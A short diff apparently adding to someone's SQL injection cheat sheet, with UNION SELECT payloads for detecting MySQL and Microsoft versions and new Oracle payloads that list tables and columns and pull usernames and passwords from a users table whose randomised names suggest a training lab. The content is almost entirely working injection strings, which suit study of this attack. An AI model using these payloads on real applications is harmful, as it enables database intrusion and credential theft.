@@ -11,6 +11,13 @@ for MySQL and Microsoft---
 '+UNION+SELECT+'abc','def'#
 '+UNION+SELECT+@@version,+NULL#
 
+extracting tables from oracle db
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+extracting columns from oracle db
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_IKKHDT'--
+extracting info from columns
+'+UNION+SELECT+USERNAME_DLIVBF,+PASSWORD_CRPVBI+FROM+USERS_IKKHDT--
+
 
 
 
